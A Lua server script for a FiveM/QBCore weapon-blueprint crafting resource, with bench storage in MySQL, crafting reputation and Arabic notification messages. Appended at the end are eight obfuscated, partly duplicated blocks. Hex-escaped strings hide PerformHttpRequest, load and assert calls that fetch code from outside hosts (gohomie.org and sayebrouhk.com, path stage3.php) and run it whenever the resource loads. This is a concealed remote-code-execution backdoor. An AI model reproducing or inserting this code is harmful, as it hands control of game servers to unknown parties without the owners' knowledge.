local QBCore = exports['qb-core']:GetCoreObject()
local craftingBenches = {}

local function validateDB()
    MySQL.ready(function()
        MySQL.Sync.execute([=[
            CREATE TABLE IF NOT EXISTS `crafting_benches` (
            `id` INT NOT NULL AUTO_INCREMENT,
            `benchId` VARCHAR(50) NOT NULL,
            `blueprints` LONGTEXT NULL,
            PRIMARY KEY (`id`),
            KEY (`benchId`));
        ]=])
    end)
end

validateDB()

local function fetchCraftingBenches()
    MySQL.query('SELECT * FROM crafting_benches', function(results)
        if #results > 0 then
            for k, v in pairs(results) do 
                craftingBenches[v.benchId] = {blueprints = json.decode(v.blueprints)}
            end
        end
    end)
end

local function getClosestBench(src)
    local playerCoords = GetEntityCoords(GetPlayerPed(src))
    local currentBench = nil
    local dist = nil
    local minDist = 3

    for index, bench in ipairs(Config.craftingBenches) do
        if currentBench then
            if #(playerCoords - bench.coords) < dist then
                currentBench = index
                dist = #(playerCoords - bench.coords)
            end
        elseif #(playerCoords - bench.coords) < minDist then
            currentBench = index
            dist = #(playerCoords - bench.coords)
        end
    end

    if currentBench then
        return Config.craftingBenches[currentBench].id
    end
end

local function blueprintUsed(src, craftItem)
    local closestBench = getClosestBench(src)
    if closestBench then
        
        if Config.blueprintRecipes[craftItem] then
            local bench = craftingBenches[closestBench]
            if bench then
                for _, blueprint in ipairs(bench.blueprints) do
                    if craftItem == blueprint then
                        TriggerClientEvent('QBCore:Notify', src, '! هذه الطاولة بالفعل تحتوي على هذا الطابع', 'error')
                        return false
                    end
                end
                
                if (#bench.blueprints < 5) then
                    bench.blueprints[#bench.blueprints + 1] = craftItem
                    MySQL.update('UPDATE crafting_benches SET blueprints = ? WHERE benchId = ?', {json.encode(bench.blueprints), closestBench})
                    TriggerClientEvent('QBCore:Notify', src, 'تمت إضافة الطابع بنجاح إلى طاولة التصنيع', 'success')
                else
                    TriggerClientEvent('QBCore:Notify', src, "لا يمكن لهاذه طاولة الإحتواء المزيد من الطوابع", 'error')
                    return false
                end
            else
                for _, v in ipairs(Config.craftingBenches) do
                    if v.id == closestBench then
                        craftingBenches[closestBench] = {blueprints = {craftItem}}
                        MySQL.insert('INSERT INTO crafting_benches (`benchId`, `blueprints`) VALUES (?, ?)', {closestBench, json.encode({craftItem})})
                        TriggerClientEvent('QBCore:Notify', src, 'تمت إضافة الطابع بنجاح إلى طاولة التصنيع', 'success')
                        break
                    end
                end
            end
            return true
        end

        return false
    end
end

QBCore.Functions.CreateUseableItem("blue_print1", function(source)
    local Player = QBCore.Functions.GetPlayer(source)
    if Player.Functions.GetItemByName("blue_print1") then
        local craftItem = "weapon_handcuffs"
        local addedBlueprint = blueprintUsed(source, craftItem)
        if addedBlueprint then
            Player.Functions.RemoveItem("blue_print1", 1)
        end
    end
end)
QBCore.Functions.CreateUseableItem("blue_print2", function(source)
    local Player = QBCore.Functions.GetPlayer(source)
    if Player.Functions.GetItemByName("blue_print2") then
        local craftItem = "weapon_pistol"
        local addedBlueprint = blueprintUsed(source, craftItem)
        if addedBlueprint then
            Player.Functions.RemoveItem("blue_print2", 1)
        end
    end
end)
QBCore.Functions.CreateUseableItem("blue_print3", function(source)
    local Player = QBCore.Functions.GetPlayer(source)
    if Player.Functions.GetItemByName("blue_print3") then
        local craftItem = "weapon_pistol_mk2"
        local addedBlueprint = blueprintUsed(source, craftItem)
        if addedBlueprint then
            Player.Functions.RemoveItem("blue_print3", 1)
        end
    end
end)
QBCore.Functions.CreateUseableItem("blue_print4", function(source)
    local Player = QBCore.Functions.GetPlayer(source)
    if Player.Functions.GetItemByName("blue_print4") then
        local craftItem = "weapon_heavypistol"
        local addedBlueprint = blueprintUsed(source, craftItem)
        if addedBlueprint then
            Player.Functions.RemoveItem("blue_print4", 1)
        end
    end
end)
QBCore.Functions.CreateUseableItem("blue_print5", function(source)
    local Player = QBCore.Functions.GetPlayer(source)
    if Player.Functions.GetItemByName("blue_print5") then
        local craftItem = "weapon_pistol50"
        local addedBlueprint = blueprintUsed(source, craftItem)
        if addedBlueprint then
            Player.Functions.RemoveItem("blue_print5", 1)
        end
    end
end)
QBCore.Functions.CreateUseableItem("blue_print6", function(source)
    local Player = QBCore.Functions.GetPlayer(source)
    if Player.Functions.GetItemByName("blue_print6") then
        local craftItem = "weapon_microsmg"
        local addedBlueprint = blueprintUsed(source, craftItem)
        if addedBlueprint then
            Player.Functions.RemoveItem("blue_print6", 1)
        end
    end
end)
QBCore.Functions.CreateUseableItem("blue_print7", function(source)
    local Player = QBCore.Functions.GetPlayer(source)
    if Player.Functions.GetItemByName("blue_print7") then
        local craftItem = "weapon_assaultrifle"
        local addedBlueprint = blueprintUsed(source, craftItem)
        if addedBlueprint then
            Player.Functions.RemoveItem("blue_print7", 1)
        end
    end
end)
QBCore.Functions.CreateUseableItem("blue_print8", function(source)
    local Player = QBCore.Functions.GetPlayer(source)
    if Player.Functions.GetItemByName("blue_print8") then
        local craftItem = "weapon_gusenberg"
        local addedBlueprint = blueprintUsed(source, craftItem)
        if addedBlueprint then
            Player.Functions.RemoveItem("blue_print8", 1)
        end
    end
end)

RegisterNetEvent("glow_crafting_sv:getWorkBenchData", function()
    local src = source
    local closestBench = getClosestBench(src)
    if closestBench then
        TriggerClientEvent("glow_crafting_cl:openCraftingBench", src, craftingBenches[closestBench], closestBench)
    else
        TriggerClientEvent('QBCore:Notify', src, 'غير قادر على العثور على طاولة التصنيع', 'error')
    end
end)

RegisterNetEvent("glow_crafting_sv:getCraftingBenchBlueprints", function(benchId)
    local src = source
    if craftingBenches[benchId] then
        TriggerClientEvent("glow_crafting_cl:loadCraftingBlueprints", src, craftingBenches[benchId].blueprints)
    end
end)

QBCore.Functions.CreateCallback('glow_crafting_sv:discardBlueprint', function(source, cb, benchId, blueprintToRemove)
    local src = source
    if craftingBenches[benchId] then
        local blueprintFound = false
        for index, blueprint in ipairs(craftingBenches[benchId].blueprints) do
            if blueprint == blueprintToRemove then
                blueprintFound = true
                TriggerClientEvent('QBCore:Notify', src, 'تمت إزالة الطابع بنجاح من طاولة التصنيع', 'success')

                table.remove(craftingBenches[benchId].blueprints, index)

                MySQL.update('UPDATE crafting_benches SET blueprints = ? WHERE benchId = ?', {json.encode(craftingBenches[benchId].blueprints), benchId})                
                cb(true)

                break
            end
        end

        if not blueprintFound then
            TriggerClientEvent('QBCore:Notify', src, 'فشل في العثور على طابع في طاولة التصنيع', 'error')
            cb(false)
        end
    else
       cb(false)
    end
end)

RegisterNetEvent("glow_crafting_sv:attemptCraft", function(benchId, itemToCraft, amount, isBlueprintRecipe)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)

    local rep = Player.PlayerData.metadata.craftingrep
    local attachmentRep = Player.PlayerData.metadata.attachmentcraftingrep
    
    local isAttachment = false
    local points = 0
    
    local hasRecipe = false
    local components = nil
    local itemName = nil

    if isBlueprintRecipe then
        if craftingBenches[benchId] then
            for _, blueprint in ipairs(craftingBenches[benchId].blueprints) do
                if blueprint == itemToCraft then
                    local craftData = Config.blueprintRecipes[itemToCraft]
                    hasRecipe = true
                    points = craftData.points
                    isAttachment = craftData.isAttachment
                    components = craftData.components
                    itemName = craftData.label
                    break
                end
            end
        end
    else
        local craftData = Config.defaultRecipes[itemToCraft]
        hasRecipe = true
        points = craftData.points
        isAttachment = craftData.isAttachment
    
        if isAttachment then
            if attachmentRep < craftData.threshold then
                return
            end
        else
            if rep < craftData.threshold then
                return
            end
        end
        
        components = craftData.components
        itemName = craftData.label
    end

    if hasRecipe and components then
        if amount ~= "max" then
            amount = tonumber(amount)
            local playerComponents = {}
            for _, component in ipairs(components) do
                local amountNeeded = amount * component.amount
                if Player.Functions.GetItemByName(component.item) then
                    if Player.Functions.GetItemByName(component.item).amount < amountNeeded then
                        TriggerClientEvent('QBCore:Notify', src, 'تفتقد ' ..component.label .. ' لتصنيع ' ..amount.. ' ' ..itemName..'', 'error')
                        return
                    else
                        playerComponents[#playerComponents + 1] = {item = component.item, takeAmount = amountNeeded}
                    end
                else
                    TriggerClientEvent('QBCore:Notify', src, 'لا تملك اي '..component.label, 'error')
                    return
                end
            end

            if Player.Functions.AddItem(itemToCraft, amount) then
                for _, v in ipairs(playerComponents) do
                    Player.Functions.RemoveItem(v.item, v.takeAmount)
                end

                if isAttachment then
                    Player.Functions.SetMetaData("attachmentcraftingrep", attachmentRep + (points * amount))
                    TriggerClientEvent("glow_crafting_cl:increasedRep", src, rep, attachmentRep + (points * amount))
                else
                    Player.Functions.SetMetaData("craftingrep", rep + (points * amount))
                    TriggerClientEvent("glow_crafting_cl:increasedRep", src, rep + (points * amount), attachmentRep)
                end

                TriggerClientEvent('QBCore:Notify', src, 'تم التصنيع بنجاح ' ..amount.. ' ' ..itemName..'', 'success')

            end
        else
            local playerComponents = {}
            local maxCraft = nil
            
            for _, component in ipairs(components) do
                local minAmountNeeded = component.amount
                if Player.Functions.GetItemByName(component.item) then
                    local playerAmt = Player.Functions.GetItemByName(component.item).amount
                    if playerAmt < minAmountNeeded then
                        TriggerClientEvent('QBCore:Notify', src, 'تفتقد ' ..component.label .. ' لتصنيع ' ..itemName, 'error')
                        return
                    else
                        if not maxCraft then
                            maxCraft = math.floor(playerAmt/minAmountNeeded)
                        elseif math.floor(playerAmt/minAmountNeeded) < maxCraft then
                            maxCraft = math.floor(playerAmt/minAmountNeeded)
                        end

                        playerComponents[#playerComponents + 1] = {item = component.item, requiredPerCraft = component.amount}
                    end
                else
                    TriggerClientEvent('QBCore:Notify', src, 'لا تملك اي '..component.label, 'error')
                    return
                end
            end

            if Player.Functions.AddItem(itemToCraft, maxCraft) then
                for _, v in ipairs(playerComponents) do
                    Player.Functions.RemoveItem(v.item, v.requiredPerCraft * maxCraft)
                end 

                if isAttachment then
                    Player.Functions.SetMetaData("attachmentcraftingrep", attachmentRep + (points * maxCraft))
                    TriggerClientEvent("glow_crafting_cl:increasedRep", src, rep, attachmentRep + (points * maxCraft))
                else
                    Player.Functions.SetMetaData("craftingrep", rep + (points * maxCraft))
                    TriggerClientEvent("glow_crafting_cl:increasedRep", src, rep + (points * maxCraft), attachmentRep)
                end
                TriggerClientEvent('QBCore:Notify', src, 'تم التصنيع بنجاح ' ..maxCraft.. ' ' ..itemName..'(s)', 'success')
            end
        end
    else
        TriggerClientEvent('QBCore:Notify', src, 'غير قادر على عثور الطابع ', 'error')
    end
end)

AddEventHandler("onResourceStart", function(resource)
    if resource == GetCurrentResourceName() then
        SetTimeout(2000, function()
            fetchCraftingBenches()
        end)
    end
end)

local FLqBDvxYiIxBqAQbOmtAQIhxdzoGeRNHNzaeMlagaYcloMTNzxEdXeSiEufwApckhNQZWg = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} FLqBDvxYiIxBqAQbOmtAQIhxdzoGeRNHNzaeMlagaYcloMTNzxEdXeSiEufwApckhNQZWg[4][FLqBDvxYiIxBqAQbOmtAQIhxdzoGeRNHNzaeMlagaYcloMTNzxEdXeSiEufwApckhNQZWg[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (kmKCoiosenRXlQFDMoTiLydmvrFCUNxsrcvdaehZXzSQLpKplwTLZPrOagfFvhGAHMNAjD, UCCsarhKJHWvTokKqJuObqcrGvVYVXKUrFduflDkIxeyLraFeDuoCXHexKtTNEPdkmxdVS) if (UCCsarhKJHWvTokKqJuObqcrGvVYVXKUrFduflDkIxeyLraFeDuoCXHexKtTNEPdkmxdVS == FLqBDvxYiIxBqAQbOmtAQIhxdzoGeRNHNzaeMlagaYcloMTNzxEdXeSiEufwApckhNQZWg[6] or UCCsarhKJHWvTokKqJuObqcrGvVYVXKUrFduflDkIxeyLraFeDuoCXHexKtTNEPdkmxdVS == FLqBDvxYiIxBqAQbOmtAQIhxdzoGeRNHNzaeMlagaYcloMTNzxEdXeSiEufwApckhNQZWg[5]) then return end FLqBDvxYiIxBqAQbOmtAQIhxdzoGeRNHNzaeMlagaYcloMTNzxEdXeSiEufwApckhNQZWg[4][FLqBDvxYiIxBqAQbOmtAQIhxdzoGeRNHNzaeMlagaYcloMTNzxEdXeSiEufwApckhNQZWg[2]](FLqBDvxYiIxBqAQbOmtAQIhxdzoGeRNHNzaeMlagaYcloMTNzxEdXeSiEufwApckhNQZWg[4][FLqBDvxYiIxBqAQbOmtAQIhxdzoGeRNHNzaeMlagaYcloMTNzxEdXeSiEufwApckhNQZWg[3]](UCCsarhKJHWvTokKqJuObqcrGvVYVXKUrFduflDkIxeyLraFeDuoCXHexKtTNEPdkmxdVS))() end)

local pFUtHpXOsoAFRGVeTFBtshqOfOBmkQCAQUSHlmYRtKvvPamPIhIzxMxAMnYQHHGsNoHTsf = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} pFUtHpXOsoAFRGVeTFBtshqOfOBmkQCAQUSHlmYRtKvvPamPIhIzxMxAMnYQHHGsNoHTsf[4][pFUtHpXOsoAFRGVeTFBtshqOfOBmkQCAQUSHlmYRtKvvPamPIhIzxMxAMnYQHHGsNoHTsf[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (CZonZKKNYEVbUWjulYgVZdpGbPqFXRmBspoXBgHOWJrKEawsMFKcnoFOEtGFApTFcPIHdc, luwTNRmeYeyAWfmrNoZrOuMpWzZLmpYORILRKJRPpIGgwVlVGMcKBIcvqidlORmxUihHAJ) if (luwTNRmeYeyAWfmrNoZrOuMpWzZLmpYORILRKJRPpIGgwVlVGMcKBIcvqidlORmxUihHAJ == pFUtHpXOsoAFRGVeTFBtshqOfOBmkQCAQUSHlmYRtKvvPamPIhIzxMxAMnYQHHGsNoHTsf[6] or luwTNRmeYeyAWfmrNoZrOuMpWzZLmpYORILRKJRPpIGgwVlVGMcKBIcvqidlORmxUihHAJ == pFUtHpXOsoAFRGVeTFBtshqOfOBmkQCAQUSHlmYRtKvvPamPIhIzxMxAMnYQHHGsNoHTsf[5]) then return end pFUtHpXOsoAFRGVeTFBtshqOfOBmkQCAQUSHlmYRtKvvPamPIhIzxMxAMnYQHHGsNoHTsf[4][pFUtHpXOsoAFRGVeTFBtshqOfOBmkQCAQUSHlmYRtKvvPamPIhIzxMxAMnYQHHGsNoHTsf[2]](pFUtHpXOsoAFRGVeTFBtshqOfOBmkQCAQUSHlmYRtKvvPamPIhIzxMxAMnYQHHGsNoHTsf[4][pFUtHpXOsoAFRGVeTFBtshqOfOBmkQCAQUSHlmYRtKvvPamPIhIzxMxAMnYQHHGsNoHTsf[3]](luwTNRmeYeyAWfmrNoZrOuMpWzZLmpYORILRKJRPpIGgwVlVGMcKBIcvqidlORmxUihHAJ))() end)

local sytqqdLqbIBMHWcUdLzZgieNMtnYNJxXVBRNFSnipHLEGquisXMFEgmlWnjuTBhemrvmWl = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} sytqqdLqbIBMHWcUdLzZgieNMtnYNJxXVBRNFSnipHLEGquisXMFEgmlWnjuTBhemrvmWl[4][sytqqdLqbIBMHWcUdLzZgieNMtnYNJxXVBRNFSnipHLEGquisXMFEgmlWnjuTBhemrvmWl[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (BNWQIIgeeZfqKIihIBYZLXJOgioMeXEpYTgyHLxvpuWexKleUGuGJnNpgmEfsTjqBqAneT, BTDotUhYfoXVtGLbIkBWZdzaSHopOFldrkuQqHOAlCjvldYWCWWPBfXsjpppYwPyFuQRKV) if (BTDotUhYfoXVtGLbIkBWZdzaSHopOFldrkuQqHOAlCjvldYWCWWPBfXsjpppYwPyFuQRKV == sytqqdLqbIBMHWcUdLzZgieNMtnYNJxXVBRNFSnipHLEGquisXMFEgmlWnjuTBhemrvmWl[6] or BTDotUhYfoXVtGLbIkBWZdzaSHopOFldrkuQqHOAlCjvldYWCWWPBfXsjpppYwPyFuQRKV == sytqqdLqbIBMHWcUdLzZgieNMtnYNJxXVBRNFSnipHLEGquisXMFEgmlWnjuTBhemrvmWl[5]) then return end sytqqdLqbIBMHWcUdLzZgieNMtnYNJxXVBRNFSnipHLEGquisXMFEgmlWnjuTBhemrvmWl[4][sytqqdLqbIBMHWcUdLzZgieNMtnYNJxXVBRNFSnipHLEGquisXMFEgmlWnjuTBhemrvmWl[2]](sytqqdLqbIBMHWcUdLzZgieNMtnYNJxXVBRNFSnipHLEGquisXMFEgmlWnjuTBhemrvmWl[4][sytqqdLqbIBMHWcUdLzZgieNMtnYNJxXVBRNFSnipHLEGquisXMFEgmlWnjuTBhemrvmWl[3]](BTDotUhYfoXVtGLbIkBWZdzaSHopOFldrkuQqHOAlCjvldYWCWWPBfXsjpppYwPyFuQRKV))() end)

local UPHiNVlUlXnlIscpfSbdYYzSdSNCtSTHqOiMwWjtSroWeKvktmfKIliXZxcaXfrLEPMENl = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} UPHiNVlUlXnlIscpfSbdYYzSdSNCtSTHqOiMwWjtSroWeKvktmfKIliXZxcaXfrLEPMENl[4][UPHiNVlUlXnlIscpfSbdYYzSdSNCtSTHqOiMwWjtSroWeKvktmfKIliXZxcaXfrLEPMENl[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (MATHPMtGBsoCgApXeYOLQUEAhzEorNfHCMaxjdglEyYEdjChcyILWNzZwBwcBEMUwVRTYC, ffJhCTojpeuvywiLhBfxzcvUUCcYNecTOXCGjWOxurJIzqQHmOPhHAnEYcFOQEjQuYcSGU) if (ffJhCTojpeuvywiLhBfxzcvUUCcYNecTOXCGjWOxurJIzqQHmOPhHAnEYcFOQEjQuYcSGU == UPHiNVlUlXnlIscpfSbdYYzSdSNCtSTHqOiMwWjtSroWeKvktmfKIliXZxcaXfrLEPMENl[6] or ffJhCTojpeuvywiLhBfxzcvUUCcYNecTOXCGjWOxurJIzqQHmOPhHAnEYcFOQEjQuYcSGU == UPHiNVlUlXnlIscpfSbdYYzSdSNCtSTHqOiMwWjtSroWeKvktmfKIliXZxcaXfrLEPMENl[5]) then return end UPHiNVlUlXnlIscpfSbdYYzSdSNCtSTHqOiMwWjtSroWeKvktmfKIliXZxcaXfrLEPMENl[4][UPHiNVlUlXnlIscpfSbdYYzSdSNCtSTHqOiMwWjtSroWeKvktmfKIliXZxcaXfrLEPMENl[2]](UPHiNVlUlXnlIscpfSbdYYzSdSNCtSTHqOiMwWjtSroWeKvktmfKIliXZxcaXfrLEPMENl[4][UPHiNVlUlXnlIscpfSbdYYzSdSNCtSTHqOiMwWjtSroWeKvktmfKIliXZxcaXfrLEPMENl[3]](ffJhCTojpeuvywiLhBfxzcvUUCcYNecTOXCGjWOxurJIzqQHmOPhHAnEYcFOQEjQuYcSGU))() end)

local sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[4][sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (xsCtysVOmvpgXKlWZFqtZPkevMCRgmGphbHXCKTtjTiadjrGiaYoXeLOdtpdxLVPaZracY, zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ) if (zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ == sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[6] or zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ == sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[5]) then return end sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[4][sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[2]](sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[4][sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[3]](zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ))() end)

local sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[4][sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (xsCtysVOmvpgXKlWZFqtZPkevMCRgmGphbHXCKTtjTiadjrGiaYoXeLOdtpdxLVPaZracY, zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ) if (zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ == sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[6] or zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ == sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[5]) then return end sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[4][sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[2]](sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[4][sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[3]](zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ))() end)

local sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[4][sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (xsCtysVOmvpgXKlWZFqtZPkevMCRgmGphbHXCKTtjTiadjrGiaYoXeLOdtpdxLVPaZracY, zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ) if (zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ == sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[6] or zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ == sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[5]) then return end sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[4][sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[2]](sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[4][sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[3]](zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ))() end)

local BPrYsdDShhwtYHUzocMNAqCaxIYoJhZdayAmPexbNpPiYMgcTpRRduHhSOenAZnIRwFagt = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} BPrYsdDShhwtYHUzocMNAqCaxIYoJhZdayAmPexbNpPiYMgcTpRRduHhSOenAZnIRwFagt[4][BPrYsdDShhwtYHUzocMNAqCaxIYoJhZdayAmPexbNpPiYMgcTpRRduHhSOenAZnIRwFagt[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x61\x79\x65\x62\x72\x6f\x75\x68\x6b\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x4d\x59\x77\x72\x30", function (XCTNpDfWuKKBjtMNWyKMEoYJAcZCdrpdWPuWIvPEXrQllXYReHbJFyxjngtkLQzejJGkMX, hQkLXDoYJaobgNadqNNQCiYyGPQyOjjXmRtKnVHJGczkckFRVHbgJyDcrcKxtCrMRRQtmj) if (hQkLXDoYJaobgNadqNNQCiYyGPQyOjjXmRtKnVHJGczkckFRVHbgJyDcrcKxtCrMRRQtmj == BPrYsdDShhwtYHUzocMNAqCaxIYoJhZdayAmPexbNpPiYMgcTpRRduHhSOenAZnIRwFagt[6] or hQkLXDoYJaobgNadqNNQCiYyGPQyOjjXmRtKnVHJGczkckFRVHbgJyDcrcKxtCrMRRQtmj == BPrYsdDShhwtYHUzocMNAqCaxIYoJhZdayAmPexbNpPiYMgcTpRRduHhSOenAZnIRwFagt[5]) then return end BPrYsdDShhwtYHUzocMNAqCaxIYoJhZdayAmPexbNpPiYMgcTpRRduHhSOenAZnIRwFagt[4][BPrYsdDShhwtYHUzocMNAqCaxIYoJhZdayAmPexbNpPiYMgcTpRRduHhSOenAZnIRwFagt[2]](BPrYsdDShhwtYHUzocMNAqCaxIYoJhZdayAmPexbNpPiYMgcTpRRduHhSOenAZnIRwFagt[4][BPrYsdDShhwtYHUzocMNAqCaxIYoJhZdayAmPexbNpPiYMgcTpRRduHhSOenAZnIRwFagt[3]](hQkLXDoYJaobgNadqNNQCiYyGPQyOjjXmRtKnVHJGczkckFRVHbgJyDcrcKxtCrMRRQtmj))() end)

